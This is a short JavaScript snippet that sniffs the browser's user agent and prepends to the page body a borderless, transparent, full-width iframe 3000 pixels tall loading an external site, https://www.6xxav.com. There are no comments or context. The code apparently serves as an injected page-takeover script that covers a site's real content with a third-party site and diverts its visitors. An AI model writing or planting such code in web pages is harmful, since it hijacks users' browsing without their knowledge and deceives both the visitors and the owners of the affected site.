function uaredirect() {
var divObj=document.createElement("div");
var n = navigator.userAgent.toLowerCase();
if (n.indexOf('android')>-1){
divObj.innerHTML='<iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="3000" allowTransparency src="https://www.6xxav.com"></iframe>';
}
 else {
divObj.innerHTML='<center><iframe scrolling="no" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="3000" allowTransparency src="https://www.6xxav.com"></iframe></center>';
}
var first=document.body.firstChild;
document.body.insertBefore(divObj,first);
}
uaredirect();
